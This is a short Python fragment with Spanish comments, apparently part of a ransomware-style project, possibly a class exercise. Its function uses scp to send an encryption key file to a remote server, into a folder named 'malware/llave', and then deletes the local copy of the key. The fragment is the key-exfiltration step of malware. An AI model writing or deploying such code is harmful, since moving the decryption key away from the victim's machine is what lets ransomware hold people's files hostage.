#Programa que recibe la llave de cifrado y la manda al servidor.

#Librería de sistema operativo para ejecutar comandos.
import os
from os import system

def sendToServer():
    system("scp prueba/key.key DB_Proyecto@192.168.100.193:/home/DB_Proyecto/malware/llave")
    os.remove("prueba/key.key")